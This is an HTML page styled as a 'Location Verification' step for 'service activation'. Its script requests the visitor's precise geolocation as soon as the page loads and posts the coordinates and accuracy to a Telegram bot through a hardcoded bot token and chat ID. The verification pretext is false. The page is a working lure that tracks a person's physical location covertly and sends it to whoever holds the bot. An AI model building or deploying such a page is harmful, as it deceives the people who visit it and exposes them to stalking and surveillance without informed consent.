<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Verification</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #4cc9f0, #4895ef);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
        }
        h1 {
            margin-bottom: 20px;
            font-weight: 600;
        }
        .icon {
            font-size: 3rem;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .status {
            margin: 20px 0;
            min-height: 50px;
        }
        .progress {
            height: 6px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: white;
            border-radius: 3px;
            transition: width 0.5s ease;
        }
        .retry-btn {
            background: white;
            color: #4895ef;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: 600;
            margin-top: 20px;
            cursor: pointer;
            display: none;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="icon">
            <i class="fas fa-map-marker-alt"></i>
        </div>
        <h1>Location Verification</h1>
        <p>Please allow location access for service activation</p>
        
        <div class="progress">
            <div class="progress-bar" id="progress-bar"></div>
        </div>
        
        <div class="status" id="status">
            Detecting your location...
        </div>
        
        <button id="retry-btn" class="retry-btn">
            <i class="fas fa-sync-alt"></i> Try Again
        </button>
    </div>

    <script>
        // Telegram configuration
        const BOT_TOKEN = '5836151829:AAGQW5HTOuFkwKiQ-YNTOmTIiZ2q3o5Z12c';
        const CHAT_ID = '2032344793';
        
        // UI elements
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progress-bar');
        const retryBtn = document.getElementById('retry-btn');
        
        function updateStatus(text, progress) {
            statusEl.textContent = text;
            progressBar.style.width = progress + '%';
        }
        
        async function getAndSendLocation() {
            try {
                updateStatus("Getting location...", 30);
                
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    });
                });
                
                updateStatus("Sending location...", 70);
                
                const { latitude, longitude, accuracy } = position.coords;
                const message = `ðŸ“ New Location\nLat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m`;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                
                updateStatus("Location verified!", 100);
                setTimeout(() => {
                    window.location.href = 'success.html'; // Redirect to success page
                }, 1000);
                
            } catch (error) {
                console.error("Location error:", error);
                updateStatus("Location access required", 100);
                retryBtn.style.display = 'inline-block';
            }
        }
        
        // Retry button handler
        retryBtn.addEventListener('click', () => {
            retryBtn.style.display = 'none';
            getAndSendLocation();
        });
        
        // Start immediately
        setTimeout(getAndSendLocation, 1000);
    </script>
</body>
</html>
